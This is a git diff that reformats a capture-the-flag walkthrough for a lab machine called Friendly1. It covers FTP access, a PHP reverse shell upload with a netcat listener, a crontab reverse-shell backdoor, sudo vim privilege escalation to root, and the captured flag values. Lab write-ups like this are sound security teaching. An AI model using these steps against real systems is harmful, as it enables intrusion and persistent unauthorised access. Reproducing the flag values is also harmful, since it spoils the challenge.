@@ -1,199 +1,279 @@
-Hello welcome to the Friendly writeups!
+# Friendly1 — TryHackMe Writeup
 
-From this machine we will be covering the full hacking cycle:
+Welcome to the **Friendly1** writeup! In this machine we cover the full hacking cycle:
 
 - Reconnaissance
 - Exploring vulnerabilities
-- Keeping persistence
-- Elevating privileges
-<img width="685" height="83" alt="image" src="https://github.com/user-attachments/assets/960e1aa8-c0b0-4fc1-a32f-0ef0511c6559" />
+- Maintaining persistence
+- Privilege escalation
 
-**Reconnaissence**
+<img width="685" alt="Hacking cycle overview" src="https://github.com/user-attachments/assets/960e1aa8-c0b0-4fc1-a32f-0ef0511c6559" />
 
-Before start with recconaissance we need to verify our interface and the IP Address of the Friendly1 machine
+---
 
-Step# 1 To verify the interface we will need to run the command **"ip a"** previously **"ifconfig"**  command, as you can see our nterface is eth0.
+## 1. Reconnaissance
 
-<img width="540" height="50" alt="image" src="https://github.com/user-attachments/assets/66d139ea-3822-4daa-9004-ac9ae50717e3" />
+Before starting reconnaissance, we need to verify our network interface and find the IP address of the Friendly1 machine.
 
-we can also run a **ping* command to check what type of machine we will be working for.
+### Step 1 — Identify the interface
 
-This one is a Linux Machine and we see it because of the Time To Life that is equal to 64, most of the Windows Machines are in a range from 127 to 150 and the Linux from 60 to 84. 
+Run the following command to check your network interface (the older equivalent is `ifconfig`):
 
-<img width="612" height="181" alt="image" src="https://github.com/user-attachments/assets/a70f3cab-0f30-41f6-a976-e161dae4322b" />
+```bash
+ip a
+```
 
+As shown below, our interface is `eth0`.
 
-Step# 2 Now that we have the interface it is time to search for the Firnedly1 machine IP Address, using the command 
+<img width="540" alt="ip a output" src="https://github.com/user-attachments/assets/66d139ea-3822-4daa-9004-ac9ae50717e3" />
 
-**sudo arp-scan -I eth0 --localnet**
+We can also ping the target to identify the type of operating system:
 
-This will display the IP Addresses for the devices using ARP in our local network. 
+```bash
+ping <target-ip>
+```
 
-In this case de Friendly IP Address is the "192.168.15.14"
+This is a **Linux** machine, which we can tell from the **TTL (Time To Live)** value of 64. Most Windows machines have a TTL between 127–150, while Linux machines are typically in the 60–84 range.
 
-<img width="402" height="74" alt="image" src="https://github.com/user-attachments/assets/3c550fb0-da09-45fe-945e-6fc2fd1fc152" />
-<img width="641" height="32" alt="image" src="https://github.com/user-attachments/assets/e476446e-0f85-408c-ad06-6cf9b6d51f06" />
+<img width="612" alt="ping TTL result" src="https://github.com/user-attachments/assets/a70f3cab-0f30-41f6-a976-e161dae4322b" />
 
+### Step 2 — Find the target's IP address
 
+Now that we know our interface, let's scan the local network for the Friendly1 machine using ARP:
 
+```bash
+sudo arp-scan -I eth0 --localnet
+```
 
+This displays every device's IP address on our local network via ARP. In this case, the Friendly1 IP address is **192.168.15.14**.
 
-Step # 3 we need to create a new directory in our Desktop with the name of Friendly1
+<img width="402" alt="arp-scan results" src="https://github.com/user-attachments/assets/3c550fb0-da09-45fe-945e-6fc2fd1fc152" />
+<img width="641" alt="Target IP confirmed" src="https://github.com/user-attachments/assets/e476446e-0f85-408c-ad06-6cf9b6d51f06" />
 
-To create a new Directory we will be using the **mkdir** command + the name of the machine
+### Step 3 — Set up the working directory
 
-So from a new terminal we will create our new directory called Friendly1
+Create a new directory on the Desktop named after the machine:
 
-<img width="586" height="190" alt="image" src="https://github.com/user-attachments/assets/a4eb90f0-47cc-42d9-828c-71ede6487a05" />
+```bash
+mkdir Friendly1
+```
 
-To continue with the scan art we will need to run a **nmap** command
+<img width="586" alt="mkdir Friendly1" src="https://github.com/user-attachments/assets/a4eb90f0-47cc-42d9-828c-71ede6487a05" />
 
-The command will be **sudo nmap -p- -sS -sC -sV --n-min-rate 5000 -n -Pn -vvv 192.168.1514 -oN results.txt** 
+### Step 4 — Port scan with Nmap
 
-We need to run the nmap command from a terminal inside Friendly1
-<img width="1142" height="613" alt="image" src="https://github.com/user-attachments/assets/61f1c558-c8fe-4abf-8f27-a3b20f41ac7f" />
+From inside the `Friendly1` directory, run a full Nmap scan:
 
-After the scan we found two ports open the 21/TCP and the 80/TCP , we will be using the 21 as it may allow ftp connection
-<img width="733" height="276" alt="image" src="https://github.com/user-attachments/assets/9aa19d92-46d9-42a5-b0cc-be4fb9e748df" />
+```bash
+sudo nmap -p- -sS -sC -sV --min-rate 5000 -n -Pn -vvv 192.168.15.14 -oN results.txt
+```
 
+After the scan, we find two open ports: **21/TCP (FTP)** and **80/TCP (HTTP)**. We'll start with port 21, since it may allow an FTP connection.
 
+<img width="1142" alt="Nmap scan results" src="https://github.com/user-attachments/assets/61f1c558-c8fe-4abf-8f27-a3b20f41ac7f" />
+<img width="733" alt="Open ports 21 and 80" src="https://github.com/user-attachments/assets/9aa19d92-46d9-42a5-b0cc-be4fb9e748df" />
 
+---
 
- **Vulnerabilities**
-At this point we will be eploring the vulnerabilities 
+## 2. Exploring Vulnerabilities
 
+At this point, we start exploring vulnerabilities. As shown in the previous scan, there's a website running on the target's IP address.
 
-If you see the picture above you will notice that there is a website using the IP Address 
-<img width="1379" height="851" alt="image" src="https://github.com/user-attachments/assets/7393b952-a20d-409a-ac56-f206befc2a3c" />
+<img width="1379" alt="Website on target IP" src="https://github.com/user-attachments/assets/7393b952-a20d-409a-ac56-f206befc2a3c" />
 
-Very important this machine has the website in a server that runds Apache2.4, sometimes these type of servers run in php as you see there are two documents in php, so this will allow us to explore with the ftp command 
+This machine hosts the website on an **Apache 2.4** server. These servers commonly run PHP — and indeed, we can see PHP files present — which means we can leverage the FTP access to upload a malicious script.
 
-So we will try the following 
+### A. Connect via FTP
 
-A- Type the command ftp + the IP Address
+```bash
+ftp <target-ip>
+```
 
-B- To connect via ftp we need to use it anonymous and it will asks us for a passwordjust hit enter
+### B. Log in anonymously
 
-with the **dir** command we access the machine
-<img width="756" height="371" alt="image" src="https://github.com/user-attachments/assets/6f2c6ecd-ae7b-480b-91da-1a57aa6a1948" />
+When prompted for a username, use `anonymous`; when prompted for a password, just press **Enter**.
 
+Once connected, use the `dir` command to list the contents:
 
-Now we are going to use a website called Reverse Shell Generator to create our reverse Shell
+```bash
+dir
+```
 
-From this website we will need to use our IP Address not the victim´s IP Address and the port that you like
-Here the steps
+<img width="756" alt="FTP anonymous login" src="https://github.com/user-attachments/assets/6f2c6ecd-ae7b-480b-91da-1a57aa6a1948" />
 
-1-Paste your Attack IP Address in the **IP /PORT** section 
-<img width="1077" height="559" alt="image" src="https://github.com/user-attachments/assets/a65a9d6e-fbc5-4500-92b9-49c440ab0738" />
+### C. Generate a reverse shell
 
+We'll use the **Reverse Shell Generator** website to build our payload. Use *your* attacker IP address (not the victim's) and a port of your choice.
 
-2-Scroll down from the left menu and select the option PHO PentestMonkey
-<img width="1360" height="569" alt="image" src="https://github.com/user-attachments/assets/fb093103-8291-4227-9187-32f041924252" />
+**1.** Paste your attacker IP address and port in the **IP/PORT** section.
 
-3-Copy the entire code 
-<img width="1360" height="569" alt="image" src="https://github.com/user-attachments/assets/a952e039-d145-4369-8153-f3ef71b2a838" />
+<img width="1077" alt="Reverse Shell Generator IP/Port" src="https://github.com/user-attachments/assets/a65a9d6e-fbc5-4500-92b9-49c440ab0738" />
 
-4-From a terminal inside the Friendly1 directory create a nano.php file in this example I will create a new one called login.php 
-<img width="499" height="137" alt="image" src="https://github.com/user-attachments/assets/ed685bd6-8a86-43c3-b4f9-8f415d0ec1a6" />
+**2.** From the left-side menu, select the **PHP PentestMonkey** option.
 
-5-Paste the code generated from ReverseShell, type Ctrl + o to save it, hit enter and Ctrl + X to close it
+<img width="1360" alt="Select PHP PentestMonkey" src="https://github.com/user-attachments/assets/fb093103-8291-4227-9187-32f041924252" />
 
-Now inside the Friendly1 Directory we have two documents login.pho and results.txt 
-<img width="468" height="159" alt="image" src="https://github.com/user-attachments/assets/3d8dad2b-7091-4d48-87b1-c6a55f969b64" />
+**3.** Copy the entire generated code.
 
-With this login.php file we will use it and upload it to the server from out ftp access.
+<img width="1360" alt="Copy the generated payload" src="https://github.com/user-attachments/assets/a952e039-d145-4369-8153-f3ef71b2a838" />
 
-To complete this we need to use the command **put** + the name of the file in this case login.php 
-<img width="1572" height="389" alt="image" src="https://github.com/user-attachments/assets/b63529c3-39bd-42f6-8cdf-a2bb1157c629" />
+**4.** From a terminal inside the `Friendly1` directory, create a new PHP file (e.g. `login.php`):
 
-Once this is uploaded to the server, we will need to start a conection for the file that we uploaded to listen to us
+```bash
+nano login.php
+```
 
-So we need to run the command **sudo nc -nlvp 444** and in paralel we need to add /login.php from the website 
-<img width="459" height="144" alt="image" src="https://github.com/user-attachments/assets/5a6f197c-642b-4bce-ae34-d6a8acd6e271" />
+<img width="499" alt="Create login.php" src="https://github.com/user-attachments/assets/ed685bd6-8a86-43c3-b4f9-8f415d0ec1a6" />
 
-<img width="1246" height="521" alt="image" src="https://github.com/user-attachments/assets/a6b1ce9a-1497-49e7-aff8-66aa9c0bf7b2" />
+**5.** Paste the generated reverse shell code, then press `Ctrl + O` to save, `Enter` to confirm, and `Ctrl + X` to exit.
 
+Now, inside the `Friendly1` directory, we have two files: `login.php` and `results.txt`.
 
-Once run the command and added login.php we can notice that now it is listening 
+<img width="468" alt="login.php and results.txt in folder" src="https://github.com/user-attachments/assets/3d8dad2b-7091-4d48-87b1-c6a55f969b64" />
 
-If we run whoami we will see out user that is **www-data**
-<img width="880" height="279" alt="image" src="https://github.com/user-attachments/assets/f204286c-846e-4c91-ae7c-e2f6c0795b71" />
+### D. Upload the payload
 
+Back in the FTP session, upload `login.php` to the server:
 
-**Persistance**
+```bash
+put login.php
+```
 
+<img width="1572" alt="FTP put login.php" src="https://github.com/user-attachments/assets/b63529c3-39bd-42f6-8cdf-a2bb1157c629" />
 
-So far we have vulnarated the machine however we need to make sure we dont loose the connection to it, so for this we will run some commands to keep persistance in the machine.
+### E. Catch the reverse shell
 
-In some machines the vulnerabilities are more complex and if we loose this connection we need to start from scratch so for this example we will use the stty treatment in two parts 
+Start a listener on the port you configured in the payload (in this case, 444):
 
- Part I
+```bash
+sudo nc -nlvp 444
+```
 
-Run the command
+At the same time, trigger the payload by visiting `/login.php` on the website.
 
-- **script /dev/null -c bash**
-Ctr + Z 
-<img width="860" height="354" alt="image" src="https://github.com/user-attachments/assets/85edf863-0452-4f2c-b67a-66967354f777" />
+<img width="459" alt="Listener started" src="https://github.com/user-attachments/assets/5a6f197c-642b-4bce-ae34-d6a8acd6e271" />
+<img width="1246" alt="Triggering login.php" src="https://github.com/user-attachments/assets/a6b1ce9a-1497-49e7-aff8-66aa9c0bf7b2" />
 
+Once triggered, the listener catches the connection. Running `whoami` confirms we're logged in as **www-data**.
 
-Run the comamnd
+<img width="880" alt="whoami www-data" src="https://github.com/user-attachments/assets/f204286c-846e-4c91-ae7c-e2f6c0795b71" />
 
--**stty raw -echo; fg** 
+---
 
-**reset xterm**
+## 3. Persistence
 
-<img width="498" height="120" alt="image" src="https://github.com/user-attachments/assets/7e254b8c-8ff9-4083-8941-82df0285f935" />
+We've compromised the machine, but we need to make sure we don't lose the connection. If the connection drops on a more complex machine, we may have to start from scratch — so we'll set up persistence in two parts.
 
-**export SHELL=bash**
+### Part I — Stabilize the shell
 
-**export TERM=xterm**
+Run the following commands, in order:
 
-<img width="419" height="105" alt="image" src="https://github.com/user-attachments/assets/7e9eddbe-05b0-48df-b2ef-05d6b2166c02" />
+```bash
+script /dev/null -c bash
+```
 
-Now if we use Crtl + C or clear we dont loose the conection
+Then press `Ctrl + Z`.
 
-Part II 
+<img width="860" alt="script /dev/null -c bash" src="https://github.com/user-attachments/assets/85edf863-0452-4f2c-b67a-66967354f777" />
 
-We will using Crontab -e (Crontab will help us to use commands in automatic for example each minute we will running a special command in this case we will use a reverseshell.
+```bash
+stty raw -echo; fg
+```
 
-For this we need to go back to the revserse shell website and from the port we need to change it to the 445 and we need to look for the option **bash-i**
-<img width="1257" height="674" alt="image" src="https://github.com/user-attachments/assets/bcd90343-ba2a-4697-af5f-a02bbad60f39" />
+Then set the terminal type:
 
-We coppy the code and paste it into our crontab file
+```bash
+reset xterm
+export SHELL=bash
+export TERM=xterm
+```
 
-using the command  * * * * * bash -c like this example then Crtl + O hit enter and Ctrl +X 
-<img width="816" height="534" alt="image" src="https://github.com/user-attachments/assets/4371b7d6-b3ed-4a47-a4eb-141c70a6e9a6" />
+<img width="498" alt="stty raw -echo; fg" src="https://github.com/user-attachments/assets/7e254b8c-8ff9-4083-8941-82df0285f935" />
+<img width="419" alt="export SHELL and TERM" src="https://github.com/user-attachments/assets/7e9eddbe-05b0-48df-b2ef-05d6b2166c02" />
 
-To verify that our crontab command works you can run in a new terminal the same **sudo nc -nlvp 445**  that each 5 minutes it will be listening automatically 
+Now, using `Ctrl + C` or `clear` won't drop the connection.
 
-<img width="674" height="197" alt="image" src="https://github.com/user-attachments/assets/ec96fa24-1266-4538-942b-bec98608e386" />
+### Part II — Persistence via Crontab
 
+We'll use `crontab -e` to automatically run a command on a schedule — in this case, a reverse shell that fires every minute.
 
-**Escalating Privileges** 
+Go back to the Reverse Shell Generator website, change the port to **445**, and select the **bash -i** option this time.
 
-to escale priviliges we will be using the command **sudo -ls**
+<img width="1257" alt="bash -i option, port 445" src="https://github.com/user-attachments/assets/bcd90343-ba2a-4697-af5f-a02bbad60f39" />
 
-This tell us that the user www-data could be a potential root from the path **/usr/bin/vim**
+Copy that code and paste it into the crontab file, using the standard cron format so it runs every minute:
 
-In this scenario we we be using a website called GTFOBins 
+```bash
+* * * * * bash -c '<reverse-shell-payload>'
+```
 
-As you see vim is the directory to become root so inside the website we will search for exploits in vim 
+Save with `Ctrl + O`, `Enter`, then exit with `Ctrl + X`.
 
-<img width="1092" height="473" alt="vim" src="https://github.com/user-attachments/assets/c2d45980-b8e4-4907-aad6-9e4dc9b542ec" />
+<img width="816" alt="Editing crontab" src="https://github.com/user-attachments/assets/4371b7d6-b3ed-4a47-a4eb-141c70a6e9a6" />
 
-Then scroll to sudo and you will find the command to run in this case
+To verify the crontab entry works, open a new terminal and start a listener on port 445 — it should catch a new connection automatically every minute:
 
-vim -c ':!/bin/sh' 
+```bash
+sudo nc -nlvp 445
+```
 
-and we complete it using the entire command
+<img width="674" alt="Listener catching cron connection" src="https://github.com/user-attachments/assets/ec96fa24-1266-4538-942b-bec98608e386" />
 
-sudo -u root vim -c ':!/bin/sh' hit enter and whoami to check what user we are 
+---
 
+## 4. Privilege Escalation
+
+To check for privilege escalation paths, run:
+
+```bash
+sudo -l
+```
+
+This shows that the `www-data` user can potentially become root via `/usr/bin/vim`.
+
+We check [GTFOBins](https://gtfobins.github.io/) for known privilege escalation techniques involving `vim`.
+
+<img width="1092" alt="GTFOBins vim entry" src="https://github.com/user-attachments/assets/c2d45980-b8e4-4907-aad6-9e4dc9b542ec" />
+
+GTFOBins gives us the sudo escalation command:
+
+```bash
+vim -c ':!/bin/sh'
+```
+
+Putting it all together:
+
+```bash
+sudo -u root vim -c ':!/bin/sh'
+```
+
+Then confirm our privilege level:
+
+```
 www-data@friendly:/$ sudo -u root vim -c ':!/bin/sh'
-
- **whoami**
- 
+# whoami
 root
+```
+
+We're now root.
+
+### Capturing the flags
+
+You can search for the flags manually, or use `find`:
+
+```bash
+find / -iname "user.txt" 2>/dev/null
+find / -iname "root.txt" 2>/dev/null
+```
+
+| Flag | Location | Value |
+|------|----------|-------|
+| **User flag** | `/home/RiJaba1/user.txt` | `b8cff8c9008e1c98a1f2937b4475acd6` |
+| **Root flag** | `/var/log/apache2/root.txt` | `66b5c58f3e83aff307441714d3e28d2f` |
+
+---
+
+*Machine rooted — full cycle complete: recon → exploitation → persistence → privilege escalation.*
 
 
 
